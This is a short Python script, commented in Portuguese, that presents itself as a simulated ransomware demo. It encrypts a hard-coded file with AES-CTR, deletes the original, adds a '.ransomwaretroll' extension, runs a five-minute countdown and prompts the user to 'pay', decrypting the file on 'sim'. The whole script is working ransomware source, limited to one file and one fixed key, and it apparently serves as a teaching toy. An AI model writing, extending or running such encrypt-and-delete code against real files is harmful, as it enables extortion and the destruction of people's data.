import os
import pyaes
import time

# Função para criptografar o arquivo
def encrypt_file(file_name, key):
    with open(file_name, "rb") as file:
        file_data = file.read()

    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    new_file_name = file_name + ".ransomwaretroll"
    with open(new_file_name, 'wb') as new_file:
        new_file.write(crypto_data)

    os.remove(file_name)
    print(f"Arquivo {file_name} criptografado com sucesso!")

# Função para descriptografar o arquivo
def decrypt_file(file_name, key):
    with open(file_name, "rb") as file:
        file_data = file.read()

    aes = pyaes.AESModeOfOperationCTR(key)
    decrypt_data = aes.decrypt(file_data)

    os.remove(file_name)

    new_file_name = file_name.replace(".ransomwaretroll", "")
    with open(new_file_name, "wb") as new_file:
        new_file.write(decrypt_data)

    print(f"Arquivo {new_file_name} restaurado com sucesso!")

# Timer para simular a pressão do tempo
def countdown(time_left):
    while time_left > 0:
        mins, secs = divmod(time_left, 60)
        print(f"Tempo restante: {mins:02d}:{secs:02d}", end="\r")
        time.sleep(1)
        time_left -= 1

    print("\nO tempo acabou! Seus arquivos foram comprometidos.")

# Função principal para executar o ransomware simulado
def main():
    file_name = "teste.txt"
    key = b"testeransomwares"

    # Criptografar o arquivo
    encrypt_file(file_name, key)

    # Definir o tempo (em segundos) para o timer
    total_time = 5 * 60  # 5 minutos

    # Iniciar o timer
    countdown(total_time)

    # Perguntar ao usuário se deseja pagar para restaurar o arquivo
    response = input("Deseja pagar para restaurar seus arquivos? (sim/não): ").strip().lower()

    if response == "sim":
        decrypt_file(file_name + ".ransomwaretroll", key)
    else:
        print("Você escolheu não pagar. Seus arquivos permanecerão criptografados.")

if __name__ == "__main__":
    main()
